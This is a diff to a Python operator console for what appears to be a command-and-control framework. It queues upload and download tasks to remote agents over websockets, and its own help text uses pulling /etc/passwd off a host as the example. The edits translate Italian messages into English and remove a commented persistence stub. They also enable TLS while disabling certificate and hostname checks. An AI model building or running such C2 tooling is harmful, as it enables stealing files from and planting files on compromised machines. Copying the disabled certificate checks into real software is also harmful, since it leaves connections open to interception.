@@ -113,14 +113,16 @@ DOWNLOAD_DESTINATIONS = {}
 
 async def event_listener(event_url):
     try:
-        print(f"\n[DEBUG] connect to channer events: {event_url}")
+        # print(f"\n[DEBUG] connect to channer events: {event_url}")
+
         # use websockets.connect(event_url,ssl=ssl_context)
-        # async with websockets.connect(event_url,ssl=ssl_context) as ws:
-        async with websockets.connect(event_url) as ws:
-            print(f"[DEBUG] ")
+        async with websockets.connect(event_url,ssl=ssl_context) as ws:
+        # async with websockets.connect(event_url) as ws:
+
+            # print(f"[DEBUG] ")
             while True:
                 response_raw = await ws.recv()
-                print(f"[DEBUG] : {response_raw}")
+                # print(f"[DEBUG] : {response_raw}")
                 
                 response = json.loads(response_raw)
                 if response.get("type") == "agent_output":
@@ -221,14 +223,14 @@ async def use_agent(websocket, agent_id, session):
 
             elif action == "upload":
                 if len(parts) < 3:
-                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: specifica file locale e destinazione remota (es. upload /tmp/file.txt /var/tmp/file.txt)"))
+                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: specify local file path and remote file path\n (es. upload /tmp/file.txt /var/tmp/file.txt)"))
                     continue
                 
                 local_path = parts[1]
                 remote_path = parts[2]
 
                 if not os.path.exists(local_path):
-                    print_formatted_text(ANSI(f"[{RED}-{RESET}] File locale non trovato: {local_path}"))
+                    print_formatted_text(ANSI(f"[{RED}-{RESET}] local file not found: {local_path}"))
                     continue
 
                 try:
@@ -244,16 +246,16 @@ async def use_agent(websocket, agent_id, session):
                     }
                     await websocket.send(json.dumps(payload))
                     _ = await websocket.recv()
-                    print_formatted_text(ANSI(f"\n{GREEN}[+] Task di upload accodato per {local_path} -> {remote_path}{RESET}\n"))
+                    print_formatted_text(ANSI(f"\n{GREEN}[+] Task upload accorded for {local_path} -> {remote_path}{RESET}\n"))
                 except Exception as e:
-                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Errore lettura file locale: {e}"))
+                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error reading local file: {e}"))
                 continue
 
 
 
             elif action == "download":
                 if len(parts) < 3:
-                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: specifica file remoto e destinazione locale (es. download /etc/passwd ./passwd.txt)"))
+                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: specify remote file path and local file path\n  (es. download /etc/passwd ./passwd.txt)"))
                     continue
                 
                 remote_path = parts[1]
@@ -270,14 +272,11 @@ async def use_agent(websocket, agent_id, session):
                 }
                 await websocket.send(json.dumps(payload))
                 _ = await websocket.recv()
-                print_formatted_text(ANSI(f"\n{BLUE}[*] Task di download accodato per {remote_path} -> {local_path}. In attesa dell'output...{RESET}\n"))
+                print_formatted_text(ANSI(f"\n{BLUE}[*] Task download accorded for {remote_path} -> {local_path}{RESET}\n"))
                 continue
 
 
 
-
-            # elif action == "percistance":
-            #     continue
 
             else:
                 command_not_fount()
@@ -295,9 +294,10 @@ async def main(server_url, event_url):
     session = PromptSession()
 
     try: 
+
         #use websockets.connect(server_url,ssl=ssl_context) for tls 
-        # async with websockets.connect(server_url,ssl=ssl_context) as websocket:
-        async with websockets.connect(server_url) as websocket:
+        async with websockets.connect(server_url,ssl=ssl_context) as websocket:
+        # async with websockets.connect(server_url) as websocket:
             asyncio.create_task(event_listener(event_url)) 
 
             with patch_stdout():
@@ -370,8 +370,8 @@ if __name__ == "__main__":
     ssl_context.check_hostname = False
     ssl_context.verify_mode = ssl.CERT_NONE
 
-    server_url = "ws://192.168.1.172:8080/ws/operator"
-    events_url= "ws://192.168.1.172:8080/ws/events"
+    server_url = "wss://192.168.1.172:8080/ws/operator"
+    events_url= "wss://192.168.1.172:8080/ws/events"
 
     try:
         asyncio.run(main(server_url,events_url))
